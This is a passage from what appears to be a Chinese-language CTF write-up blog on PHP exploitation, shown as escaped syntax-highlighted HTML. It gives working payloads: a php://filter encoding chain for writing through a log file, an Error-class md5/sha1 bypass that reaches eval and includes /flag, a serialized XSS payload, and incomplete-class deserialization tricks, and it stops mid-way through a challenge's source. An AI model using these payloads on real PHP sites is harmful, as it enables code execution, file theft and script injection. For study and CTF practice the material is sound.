&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$payload&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">iconv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;UCS-2&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;payload.txt&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">quoted_printable_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$payload&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;payload.txt&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">preg_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/=\r\n/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$s&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$s&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>开打：首先写payload，然后第一个过滤器&lt;/p>
&lt;pre tabindex="0">&lt;code>php://filter/write=convert.quoted-printable-decode/resource=log/error.txt
&lt;/code>&lt;/pre>&lt;p>第二个&lt;/p>
&lt;pre tabindex="0">&lt;code>php://filter/write=convert.iconv.ucs-2.utf-8/resource=log/error.txt
&lt;/code>&lt;/pre>&lt;p>第三个&lt;/p>
&lt;pre tabindex="0">&lt;code>php://filter/write=convert.base64-decode/resource=log/error.txt
&lt;/code>&lt;/pre>&lt;p>这里出现一个问题，末尾等号少一个，我们需要在payload末尾再加一个&lt;code>=00=3D&lt;/code>让等号正常露出&lt;/p>
&lt;p>改好之后清空日志文件，直接三个过滤器一起用&lt;/p>
&lt;pre tabindex="0">&lt;code>php://filter/read=convert.quoted-printable-decode|convert.iconv.ucs-2.utf-8|convert.base64-decode/resource=log/error.txt
&lt;/code>&lt;/pre>&lt;p>得到flag&lt;/p>
&lt;p>参考：&lt;a href="http://arsenetang.com/2021/11/29/WP%E7%AF%87%E4%B9%8B%E8%A7%A3%E6%9E%90GFCTF---%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B%E5%99%A8/">wp&lt;/a>&lt;/p>
&lt;h2 id="原生报错异常类">原生报错/异常类&lt;/h2>
&lt;h3 id="errorexception---绕md5">Error/Exception - 绕md5&lt;/h3>
&lt;h3 id="极客大挑战-2020greatphp">[极客大挑战 2020]Greatphp&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">error_reporting&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">SYCLOVER&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$syc&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$lover&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__wakeup&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">syc&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">lover&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">md5&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">syc&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#75af00">md5&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">lover&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">sha1&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">syc&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#75af00">sha1&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">lover&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/\&amp;lt;\?php|\(|\)|&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">|\&amp;#39;/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">syc&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$match&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">syc&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Try Hard !!&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;great&amp;#39;&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;great&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>平常都是用数组，但是这是在类里面，数组就不行了，得用原生类&lt;code>Error&lt;/code>（php7）或&lt;code>Exception&lt;/code>（php5 or 7），它有&lt;code>__toString&lt;/code>方法，被触发后会以字符串形式输出当前保存情况，包括错误信息和当前报错的行号，而跟传入的参数没有关系；所以说可以构造两个类的实例，它们行号相同（被&lt;code>__toString&lt;/code>调用后输出信息一样），但是本身不相同（传入参数不等）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;?&amp;gt;&amp;lt;?=include~&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">urldecode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">~&lt;/span>&lt;span style="color:#d88200">&amp;#39;/flag&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;?&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$payload&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#111">$b&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$payload&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">SYCLOVER&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$s&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">syc&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$s&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">lover&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$s&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>注意&lt;code>$a&lt;/code>和&lt;code>$b&lt;/code>写到一行&lt;/p>
&lt;h3 id="errorexception---xss">Error/Exception - XSS&lt;/h3>
&lt;p>参考：&lt;a href="https://www.cnblogs.com/NPFS/p/13385038.html">关于如何利用php的原生类进行XSS&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;script&amp;gt;alert(&amp;#39;xss&amp;#39;)&amp;lt;/script&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$b&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="二次序列化fast-destruct">二次序列化/fast destruct&lt;/h2>
&lt;p>&lt;a href="https://zhuanlan.zhihu.com/p/405838002">https://zhuanlan.zhihu.com/p/405838002&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$raw&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;O:1:&amp;#34;A&amp;#34;:1:{s:1:&amp;#34;a&amp;#34;;s:1:&amp;#34;b&amp;#34;;}&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$raw&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//O:1:&amp;#34;A&amp;#34;:1:{s:1:&amp;#34;a&amp;#34;;s:1:&amp;#34;b&amp;#34;;}
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>上面是一个相当正常的二次序列化的栗子（将序列化结果反序列化后再序列化），值得注意的是这里并不是真的有一个类A，在操作时 php内部会把不存在的类转换成&lt;code>__PHP_Incomplete_Class&lt;/code>这种特殊的类，同时将原始的类名&lt;code>A&lt;/code>存放在&lt;code>__PHP_Incomplete_Class_Name&lt;/code>这个属性中，其余属性存放方式不变；而我们在序列化这个对象的时候，serialize遇到&lt;code>__PHP_Incomplete_Class&lt;/code>这个特殊类会倒推回来，序列化成&lt;code>__PHP_Incomplete_Class_Name&lt;/code>值为类名的类，我们看到的序列化结果不是&lt;code>O:22:&amp;quot;__PHP_Incomplete_Class_Name&amp;quot;:2:{xxx}&lt;/code>而是&lt;code>O:1:&amp;quot;A&amp;quot;:1:{s:1:&amp;quot;a&amp;quot;;s:1:&amp;quot;b&amp;quot;;}&lt;/code>，所以如果我们构造&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$raw&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;a:2:{i:0;O:8:&amp;#34;stdClass&amp;#34;:1:{s:3:&amp;#34;abc&amp;#34;;N;}i:1;O:22:&amp;#34;__PHP_Incomplete_Class&amp;#34;:1:{s:3:&amp;#34;abc&amp;#34;;N;}}&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$raw&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$raw&lt;/span>&lt;span style="color:#111">))));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220421101436718.png" alt="image-20220421101436718">&lt;/p>
&lt;p>可以注意到在二次序列化后&lt;code>__PHP_Incomplete_Class&lt;/code>为空，出现&lt;code>serialize(unserialize($x))!=$x&lt;/code>的情况&lt;/p>
&lt;h3 id="强网杯-2021whereisuwebshell">[强网杯 2021]WhereIsUWebShell&lt;/h3>
&lt;p>&lt;a href="https://miaotony.xyz/2021/06/28/CTF_2021qiangwang/#toc-heading-5">https://miaotony.xyz/2021/06/28/CTF_2021qiangwang/#toc-heading-5&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;!--&lt;/span> &lt;span style="color:#75af00">You&lt;/span> &lt;span style="color:#75af00">may&lt;/span> &lt;span style="color:#75af00">need&lt;/span> &lt;span style="color:#75af00">to&lt;/span> &lt;span style="color:#75af00">know&lt;/span> &lt;span style="color:#75af00">what&lt;/span> &lt;span style="color:#75af00">is&lt;/span> &lt;span style="color:#75af00">in&lt;/span> &lt;span style="color:#75af00">e2a7106f1cc8bb1e1318df70aa0a3540&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">php&lt;/span>&lt;span style="color:#f92672">--&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// index.php
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">ini_set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;display_errors&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;on&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_COOKIE&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;ctfer&amp;#39;&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">setcookie&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ctfer&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ctfer&amp;#34;&lt;/span>&lt;span style="color:#111">),&lt;/span>&lt;span style="color:#75af00">time&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">3600&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">include&lt;/span> &lt;span style="color:#d88200">&amp;#34;function.php&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;I see your Cookie&amp;lt;br&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_COOKIE&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;ctfer&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/myclass/i&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$res&lt;/span>&lt;span style="color:#111">))){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Error: Class &amp;#39;myclass&amp;#39; not found &amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;myclass.php&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;function.php&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// myclass.php
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Hello&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">qwb&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">qwb&lt;/span>&lt;span style="color:#111">);&lt;/span>
